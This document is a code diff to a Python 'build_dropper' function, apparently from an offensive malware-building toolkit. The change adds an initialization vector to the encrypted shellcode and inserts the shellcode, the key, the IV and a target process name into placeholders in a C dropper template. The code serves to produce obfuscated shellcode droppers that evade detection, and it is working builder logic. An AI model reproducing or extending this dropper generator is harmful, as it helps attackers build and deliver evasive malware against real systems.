@@ -117,14 +117,14 @@ def build_dropper(**kwargs):
 
     # Step 2: Generate obfuscated shellcode
     shellcode = extract_shellcode(shellcode_path)
-    shellcode, enc_key = generate_shellcode(shellcode, algorithm=encryption_or_obfuscation_algorithm.split(' ')[0])
-    #print(f"Shellcode: {shellcode[0:100]}")
-    #print(f"Encryption Key: {enc_key}")
+    shellcode, enc_key, iv = generate_shellcode(shellcode, algorithm=encryption_or_obfuscation_algorithm.split(' ')[0])
     
-    # Step 3: Replace placeholder in dropper.c
+    # Step 3: Replace placeholders in dropper.c
     placehodlers = {"/* SHELLCODE */": format_shellcode(shellcode)}
     if enc_key:
         placehodlers["/* KEY */"] = f"unsigned char key [] = {{\n\t{enc_key}\n}};"
+    if iv:
+        placehodlers["/* IV */"] = f"unsigned char iv [] = {{\n\t{iv}\n}};"
     if kwargs.get("process_name"):
         placehodlers["/* PROCESS_NAME */"] = f"L\"{kwargs.get('process_name')}\""
     
@@ -136,7 +136,7 @@ def build_dropper(**kwargs):
 
     # Step 5: Convert other kwargs into uppercase and remove spaces
     formatted_args = [
-        f"{key.replace(' ', '_').upper()}={str(value).replace(' ', '_').replace('~', 'IN').upper()}"
+        f"{key.replace(' ', '_').upper()}={str(value).replace(' ', '_').replace('~', 'IN').split('_(')[0].upper()}"
         for key, value in kwargs.items() if value
     ]
 
